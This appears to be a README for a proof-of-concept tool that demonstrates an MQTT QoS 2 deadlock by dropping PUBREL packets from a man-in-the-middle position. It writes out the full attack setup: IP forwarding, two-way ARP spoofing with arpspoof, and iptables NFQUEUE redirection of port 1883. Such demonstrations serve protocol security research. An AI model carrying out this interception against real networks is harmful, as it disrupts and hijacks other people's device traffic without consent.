MQTT QoS 2 PUBREL Dropper

This script acts as a packet handler to selectively drop MQTT PUBREL packets (control byte 0x60) while allowing PUBLISH and PUBREC frames to pass. It is designed to be used in a Man-in-the-Middle (MITM) position to demonstrate the MQTT QoS 2 protocol-level deadlock condition.

Prerequisites
The script is intended to run on a Linux environment (e.g., Kali Linux) positioned between the MQTT client and the broker.

Install the required Python dependencies:

pip install scapy NetfilterQueue

Network Configuration
Before executing the script, you must intercept the traffic and route it to an NFQUEUE so the script can inspect and manipulate the packets in transit.

1. Enable IP Forwarding

echo 1 > /proc/sys/net/ipv4/ip_forward

2. Initiate ARP Spoofing
Use arpspoof (or a similar tool) to poison the ARP caches and intercept traffic between the target device and the MQTT broker.

# Spoof Broker to Target
arpspoof -i <interface> -t <target_ip> <broker_ip>

# Spoof Target to Broker
arpspoof -i <interface> -t <broker_ip> <target_ip>

3. Configure IPtables
Redirect the forwarded MQTT traffic (default port 1883) into an NFQUEUE.

iptables -I FORWARD -p tcp --dport 1883 -j NFQUEUE --queue-num 1
Usage - Once the network routing is configured and traffic is actively flowing through queue-num 1, execute the packet handler:

python3 mqtt_qos2_dropper.py
The script will monitor the forwarded traffic, parse the MQTT fixed headers, and explicitly drop any packet identified as a PUBREL frame.

Cleanup
After testing, ensure you clean up your IPtables rules to restore normal network flow:

# Flush the NFQUEUE rule
iptables -D FORWARD -p tcp --dport 1883 -j NFQUEUE --queue-num 1
